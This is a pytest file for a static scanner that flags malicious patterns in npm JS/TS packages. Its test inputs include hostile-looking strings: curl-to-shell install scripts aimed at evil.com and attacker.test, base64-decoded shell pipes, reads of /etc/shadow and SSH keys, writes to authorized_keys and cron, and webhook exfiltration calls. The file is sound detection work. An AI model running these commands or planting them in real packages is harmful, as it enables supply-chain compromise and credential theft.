"""Tests for Veritor's static security scanner covering JS/TS AST analysis.

All tested code snippets are harmless simulated patterns that are only parsed via AST,
never executed.
"""

import base64
from pathlib import Path

from app.analysis.analyzer import analyze_package
from app.analysis.js_scanner import scan_source, scannable_language
from app.analysis.models import (
    FindingCategory,
    FindingConfidence,
    Severity,
)
from app.comparison.compare import compare_inventories
from tests.test_comparison import inventory, make_metadata, matched


def test_every_finding_contains_all_required_contract_fields(tmp_path: Path) -> None:
    """Every finding must include:

    rule_id, file path (path), line number (line), severity, evidence,
    explanation, confidence, and recommended_action.
    """
    pkg_files = {
        "package.json": '{"name":"demo-pkg","version":"1.0.0"}',
        "index.js": (
            "const cp = require('child_process');\n"
            "cp.exec(userCommand);\n"
            "eval(computedCode);\n"
            "fetch('https://webhook.site/test-hook');\n"
        ),
    }
    pkg_inv = inventory(tmp_path, "pkg", pkg_files)
    meta = make_metadata("demo-pkg")
    analysis = analyze_package(meta, pkg_inv, None, None)

    assert len(analysis.findings) > 0
    for finding in analysis.findings:
        # 1. rule_id
        assert isinstance(finding.rule_id, str) and len(finding.rule_id) > 0
        # 2. file path
        assert isinstance(finding.path, str) and len(finding.path) > 0
        # 3. line number
        assert isinstance(finding.line, int) and finding.line >= 1
        # 4. severity
        assert isinstance(finding.severity, Severity)
        # 5. evidence
        assert isinstance(finding.evidence, str) and len(finding.evidence) > 0
        # 6. explanation
        assert isinstance(finding.explanation, str) and len(finding.explanation) > 0
        # 7. confidence
        assert isinstance(finding.confidence, FindingConfidence)
        # 8. recommended_action
        assert isinstance(finding.recommended_action, str) and len(finding.recommended_action) > 0


def test_typescript_and_tsx_ast_parsing() -> None:
    """Test AST scanning for TypeScript, TSX, and modern typed idioms."""
    assert scannable_language("src/index.ts") == "typescript"
    assert scannable_language("src/component.tsx") == "tsx"
    assert scannable_language("lib/module.mts") == "typescript"
    assert scannable_language("dist/types.d.ts") is None  # Declarations skipped

    ts_code = """
    interface CommandConfig {
        cmd: string;
        options?: Record<string, string>;
    }

    export function runCommand<T extends CommandConfig>(config: T): void {
        const { exec } = require('child_process');
        exec(config.cmd);
    }
    """
    result = scan_source(ts_code.encode(), "typescript")
    rule_ids = {hit.rule_id for hit in result.hits}
    assert "PROC-001" in rule_ids  # Imports child_process
    assert "PROC-003" in rule_ids  # Starts computed command

    tsx_code = """
    import React from 'react';
    export const Widget = () => {
        const token = process.env.API_KEY;
        return <div>{token}</div>;
    };
    """
    tsx_result = scan_source(tsx_code.encode(), "tsx")
    assert any(h.rule_id == "ENV-002" for h in tsx_result.hits)


def test_category_1_eval_and_new_function() -> None:
    """Detection of dynamic code execution patterns."""
    snippets = [
        ("eval(userInput)", "EXEC-001"),
        ("new Function('x', 'return ' + userInput)", "EXEC-001"),
        ("(0, eval)(untrustedPayload)", "EXEC-001"),
        ("globalThis.eval(payload)", "EXEC-001"),
        ("require('vm').runInNewContext(code)", "EXEC-001"),
        ("Function('return this')()", "EXEC-002"),
        ("eval(atob(b64))", "EXEC-003"),
        ("new Function(Buffer.from(b, 'hex').toString())()", "EXEC-003"),
        ("require(moduleVar)", "EXEC-004"),
        ("require(atob(encodedName))", "EXEC-005"),
    ]
    for code, expected_rule in snippets:
        res = scan_source(code.encode(), "javascript")
        assert any(h.rule_id == expected_rule for h in res.hits), f"Failed on: {code}"


def test_category_2_child_process_execution() -> None:
    """Detection of child_process invocation patterns."""
    snippets = [
        ("require('child_process')", "PROC-001"),
        ("require('node:child_process')", "PROC-001"),
        ("require('child_process').exec('ls -la')", "PROC-002"),
        ("require('child_process').spawn('npm', ['test'])", "PROC-002"),
        ("const { execSync } = require('child_process'); execSync(dynamicCmd)", "PROC-003"),
        ("require('child_process').exec('curl http://attacker.test/run | sh')", "PROC-004"),
        ("require('child_process').exec('echo aGk= | base64 -d | sh')", "PROC-004"),
        ("process.binding('spawn_sync')", "PROC-005"),
    ]
    for code, expected_rule in snippets:
        res = scan_source(code.encode(), "javascript")
        assert any(h.rule_id == expected_rule for h in res.hits), f"Failed on: {code}"


def test_category_3_process_env_access() -> None:
    """Detection of process.env access, credential variables, and full dump."""
    # Ordinary env var
    res1 = scan_source(b"const port = process.env.PORT || 3000;", "javascript")
    assert any(h.rule_id == "ENV-001" for h in res1.hits)
    assert all(h.severity <= Severity.LOW for h in res1.hits)

    # Sensitive / Credential env vars
    credentials = [
        "const key = process.env.AWS_SECRET_ACCESS_KEY;",
        "const token = process.env['NPM_TOKEN'];",
        "const gh = process.env.GITHUB_TOKEN;",
        "const secret = process.env.DB_PASSWORD;",
        "const { API_KEY } = process.env;",
    ]
    for code in credentials:
        res = scan_source(code.encode(), "javascript")
        assert any(h.rule_id == "ENV-002" for h in res.hits)

    # Whole environment access / dumping
    res3 = scan_source(b"fetch('/log', { body: JSON.stringify(process.env) });", "javascript")
    assert any(h.rule_id == "ENV-003" for h in res3.hits)


def test_category_4_unexpected_outbound_network() -> None:
    """Detection of outbound network calls, data collectors, and public IP calls."""
    # Standard network
    res1 = scan_source(b"fetch('https://api.github.com/repos');", "javascript")
    assert any(h.rule_id == "NET-001" for h in res1.hits)

    # Data collection endpoints
    collectors = [
        "fetch('https://webhook.site/12345678');",
        "fetch('https://discord.com/api/webhooks/999/xyz');",
        "fetch('https://pipedream.net/r/test');",
        "fetch('http://198.51.100.24/collect');",  # Public IP
    ]
    for code in collectors:
        res = scan_source(code.encode(), "javascript")
        assert any(h.rule_id == "NET-002" for h in res.hits), f"Failed for: {code}"

    # Target address as string literal
    res3 = scan_source(b"const endpoint = 'https://webhook.site/abc';", "javascript")
    assert any(h.rule_id == "NET-003" for h in res3.hits)


def test_category_5_base64_and_obfuscation() -> None:
    """Detection of obfuscated names, large encoded blobs, fromCharCode, and decoding."""
    # Obfuscator names (_0x...)
    obf_vars = "var " + ", ".join(f"_0x{i:04x} = {i}" for i in range(10)) + ";"
    res1 = scan_source(obf_vars.encode(), "javascript")
    assert any(h.rule_id == "OBF-001" for h in res1.hits)

    # High entropy encoded string
    blob = base64.b64encode(bytes((x * 37) % 256 for x in range(300))).decode()
    res2 = scan_source(f"const payload = '{blob}';".encode(), "javascript")
    assert any(h.rule_id == "OBF-002" for h in res2.hits)

    # String.fromCharCode
    res3 = scan_source(b"String.fromCharCode(104, 101, 108, 108, 111, 32, 119, 111);", "javascript")
    assert any(h.rule_id == "OBF-003" for h in res3.hits)

    # Base64 runtime decoding
    res4 = scan_source(b"const data = atob(rawPayload);", "javascript")
    assert any(h.rule_id == "OBF-004" for h in res4.hits)

    res5 = scan_source(b"const buf = Buffer.from(rawPayload, 'base64');", "javascript")
    assert any(h.rule_id == "OBF-004" for h in res5.hits)


def test_category_6_suspicious_filesystem_operations() -> None:
    """Detection of reads/writes to credentials and system startup files."""
    reads = [
        "const fs = require('fs'); fs.readFileSync('/etc/passwd');",
        "const fs = require('fs'); fs.readFileSync('/etc/shadow');",
        "require('fs').readFile(path.join(home, '.ssh', 'id_rsa'), cb);",
        "require('fs').readFileSync('.npmrc');",
        "require('fs').readFileSync('.env');",
    ]
    for code in reads:
        res = scan_source(code.encode(), "javascript")
        assert any(h.rule_id == "FS-001" for h in res.hits), f"Failed for read: {code}"

    writes = [
        "require('fs').writeFileSync('/root/.ssh/authorized_keys', key);",
        "require('fs').appendFileSync(path.join(home, '.bashrc'), exportLine);",
        "require('fs').writeFileSync('/etc/cron.d/malicious', cronJob);",
    ]
    for code in writes:
        res = scan_source(code.encode(), "javascript")
        assert any(h.rule_id == "FS-002" for h in res.hits), f"Failed for write: {code}"


def test_category_7_preinstall_install_and_postinstall_scripts(tmp_path: Path) -> None:
    """Detection of untracked, changed, or risky npm lifecycle scripts."""
    # 1. Risky command in install script (LIFE-005)
    meta = make_metadata("demo-pkg", scripts={"preinstall": "curl -s http://evil.com/setup | sh"})
    pkg_files = {
        "package.json": (
            '{"name":"demo-pkg","version":"1.0.0",'
            '"scripts":{"preinstall":"curl -s http://evil.com/setup | sh"}}'
        ),
    }
    inv = inventory(tmp_path, "pkg_risky", pkg_files)

    analysis = analyze_package(meta, inv, None, None)
    rule_ids = {f.rule_id for f in analysis.findings}
    assert "LIFE-005" in rule_ids  # Install script fetches or runs inline code
    assert "LIFE-007" in rule_ids  # Cannot be traced to source (no source report)


def test_source_to_package_differences_and_preexisting_code(tmp_path: Path) -> None:
    """Pre-existing patterns in source are not treated as new introduced vulnerabilities."""
    source_files = {
        "package.json": '{"name":"demo-pkg","version":"1.0.0"}',
        "src/utils.js": (
            "// Existing helper\n"
            "const port = process.env.NODE_ENV;\n"
            "const url = 'https://api.github.com';\n"
            "function get() { return fetch(url); }\n"
        ),
    }
    # Package adds a line but keeps existing fetch and process.env
    pkg_files = {
        "package.json": '{"name":"demo-pkg","version":"1.0.0"}',
        "src/utils.js": (
            "// Existing helper\n"
            "const logger = console.log;\n"
            "const port = process.env.NODE_ENV;\n"
            "const url = 'https://api.github.com';\n"
            "function get() { return fetch(url); }\n"
        ),
    }

    src_inv = inventory(tmp_path, "src_diff", source_files)
    pkg_inv = inventory(tmp_path, "pkg_diff", pkg_files)

    meta = make_metadata("demo-pkg")
    report = compare_inventories(meta, matched(), pkg_inv, src_inv)

    analysis = analyze_package(meta, pkg_inv, report, src_inv)
    # The pre-existing fetch and process.env should NOT be introduced findings!
    introduced_rules = {f.rule_id for f in analysis.findings}
    assert "NET-001" not in introduced_rules
    assert "ENV-001" not in introduced_rules


def test_benign_ordinary_patterns_are_not_flagged_as_malicious() -> None:
    """Ordinary code such as comments, string literals, and private IPs are not flagged."""
    benign_code = """
    // This comment discusses eval(payload) and child_process.exec()
    const description = "Avoid using eval(x) in user code";
    const localUrl = "http://127.0.0.1:8080/health";
    const privateIp = "http://192.168.1.100/status";
    const authorName = process.env.AUTHOR || "maintainer";
    const obj = { eval: (val) => val * 2 };
    obj.eval(10);
    """
    res = scan_source(benign_code.encode(), "javascript")
    rule_ids = {h.rule_id for h in res.hits}
    assert "EXEC-001" not in rule_ids
    assert "PROC-001" not in rule_ids
    assert "PROC-002" not in rule_ids
    assert "NET-002" not in rule_ids  # Private/local IPs are not public collection IPs
    assert "ENV-002" not in rule_ids  # AUTHOR is not a credential


def test_multi_signal_correlation_and_suspicious_artifact(tmp_path: Path) -> None:
    """Multi-signal correlation elevated findings in suspicious artifacts."""
    # Credential read + network call in same file -> CORR-001
    code = (
        "const token = process.env.NPM_TOKEN;\n"
        "fetch('https://api.github.com', { headers: { Authorization: token } });\n"
    )
    pkg_files = {
        "package.json": '{"name":"demo-pkg","version":"1.0.0"}',
        "index.js": code,
    }
    inv = inventory(tmp_path, "corr_pkg", pkg_files)

    analysis = analyze_package(make_metadata("demo-pkg"), inv, None, None)
    rules = {f.rule_id for f in analysis.findings}
    assert "CORR-001" in rules
    corr_finding = next(f for f in analysis.findings if f.rule_id == "CORR-001")
    assert corr_finding.severity >= Severity.HIGH
    assert corr_finding.category == FindingCategory.CORRELATED_BEHAVIOUR
    assert corr_finding.explanation != ""
    assert corr_finding.recommended_action != ""
